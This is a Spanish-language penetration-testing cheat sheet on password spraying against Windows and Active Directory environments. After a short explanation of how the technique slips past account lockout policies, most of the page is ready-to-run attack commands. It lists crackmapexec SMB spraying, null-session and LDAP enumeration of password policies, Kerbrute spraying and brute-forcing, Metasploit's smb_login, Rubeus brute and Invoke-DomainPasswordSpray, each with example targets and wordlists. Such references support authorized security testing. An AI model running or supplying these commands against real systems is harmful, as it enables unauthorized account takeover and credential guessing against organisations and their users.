# Password Spraying

## Qué es?

El <mark style="color:green;">Password Spraying</mark> es una técnica de ataque cibernético que consiste en probar una sola contraseña común o débil contra una gran cantidad de nombres de usuario. A diferencia de otros métodos de ataque de fuerza bruta que prueban muchas contraseñas en un solo usuario, el password spraying aplica una contraseña (generalmente una conocida por ser comúnmente utilizada o fácil de adivinar) en muchos usuarios. Esta técnica es efectiva en eludir políticas de bloqueo de cuentas que se activan tras varios intentos fallidos de acceso, ya que el ataque no supera el límite de intentos fallidos para un solo usuario. Es comúnmente utilizada en ataques contra sistemas de autenticación en línea, como interfaces de correo electrónico o servicios basados en la nube.

## Comandos

### Crackmapexe

```bash
crackmapexec smb 192.168.1.101 -u user1 user2 user3 -p Summer18
crackmapexec smb 192.168.1.101 -u user1 -p password1 password2 password3

crackmapexec smb 192.168.1.101 -u /path/to/users.txt -p Summer18
crackmapexec smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt
```

### Política de contraseñas

```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10; 
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```

### Kerbrute - Linux

{% code overflow="wrap" %}
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123

# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
{% endcode %}

{% embed url="https://github.com/ropnop/kerbrute" %}

### Metasploit

<pre><code><strong>use scanner/smb/smb_login
</strong></code></pre>

<figure><img src="https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-Lro8N5HY_Bsuc0kb_bC%2F-Lro9ANRKPcKS1wbCybd%2Fimage.png?alt=media&#x26;token=515958d7-0358-4c1f-ba46-b3cd38f0ff1e" alt=""><figcaption></figcaption></figure>

### Rubeus - Windows

{% code overflow="wrap" %}
```powershell
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
{% endcode %}

{% embed url="https://github.com/GhostPack/Rubeus" %}

### DomainPasswordSpray - windows

{% code overflow="wrap" %}
```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
{% endcode %}



## Referencias

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying" %}

{% embed url="https://www.crackmapexec.wiki/smb-protocol/password-spraying" %}



